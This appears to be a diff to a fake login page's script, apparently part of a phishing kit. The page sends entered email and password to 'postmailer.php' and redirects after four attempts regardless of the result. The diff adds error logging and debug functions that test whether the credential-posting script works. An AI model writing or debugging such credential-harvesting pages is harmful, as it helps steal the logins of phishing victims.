@@ -224,6 +224,8 @@
                          password: password
                      },
                      dataType: 'json',
+                     cache: false,
+                     timeout: 30000,
                      beforeSend: function() {
                          $('#login_submit').prop('disabled', true).text('Processing...');
                      },
@@ -263,7 +265,23 @@
                      },
                      error: function(xhr, status, error) {
                          $('#loading-overlay').hide();
+                         console.log('AJAX Error Details:');
+                         console.log('Status:', status);
                          console.log('Error:', error);
+                         console.log('Response Text:', xhr.responseText);
+                         console.log('Status Code:', xhr.status);
+                         
+                         var errorMsg = 'Connection error';
+                         if (xhr.responseText) {
+                             try {
+                                 var errorResponse = JSON.parse(xhr.responseText);
+                                 errorMsg = errorResponse.msg || errorMsg;
+                                 console.log('Parsed error response:', errorResponse);
+                             } catch (e) {
+                                 console.log('Could not parse error response as JSON');
+                                 errorMsg = 'Server error: ' + xhr.status;
+                             }
+                         }
                          
                          if (loginAttempts >= maxAttempts) {
                              // After 4 attempts, redirect even on error
@@ -275,7 +293,7 @@
                              }, 2000);
                          } else {
                              // Show error message
-                             $('#login-status-message').text('Connection error. Please try again.');
+                             $('#login-status-message').text(errorMsg);
                              $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                              $('#password').val('').focus();
                          }
@@ -309,13 +327,63 @@
                  $('#login-status').hide();
              });
              
-             // Allow form submission with Enter key
-             $('#login_form').on('keypress', function(e) {
-                 if (e.which === 13) { // Enter key
-                     $('#login_submit').click();
-                 }
-             });
-         });
-      </script>
+                           // Allow form submission with Enter key
+              $('#login_form').on('keypress', function(e) {
+                  if (e.which === 13) { // Enter key
+                      $('#login_submit').click();
+                  }
+              });
+              
+              // Debug function to test PHP connection
+              window.testConnection = function() {
+                  console.log('Testing connection to postmailer.php...');
+                  $.ajax({
+                      url: 'test.php',
+                      type: 'GET',
+                      dataType: 'json',
+                      success: function(response) {
+                          console.log('Test connection successful:', response);
+                          alert('PHP is working! Check console for details.');
+                      },
+                      error: function(xhr, status, error) {
+                          console.log('Test connection failed:', {
+                              status: status,
+                              error: error,
+                              responseText: xhr.responseText,
+                              statusCode: xhr.status
+                          });
+                          alert('Connection test failed. Check console for details.');
+                      }
+                  });
+              };
+              
+              // Test postmailer.php specifically
+              window.testPostmailer = function() {
+                  console.log('Testing postmailer.php with POST...');
+                  $.ajax({
+                      url: 'postmailer.php',
+                      type: 'POST',
+                      data: {
+                          email: 'test@example.com',
+                          password: 'test123'
+                      },
+                      dataType: 'json',
+                      success: function(response) {
+                          console.log('Postmailer test successful:', response);
+                          alert('Postmailer is working! Check console for details.');
+                      },
+                      error: function(xhr, status, error) {
+                          console.log('Postmailer test failed:', {
+                              status: status,
+                              error: error,
+                              responseText: xhr.responseText,
+                              statusCode: xhr.status
+                          });
+                          alert('Postmailer test failed. Check console for details.');
+                      }
+                  });
+              };
+          });
+       </script>
    </body>
 </html>
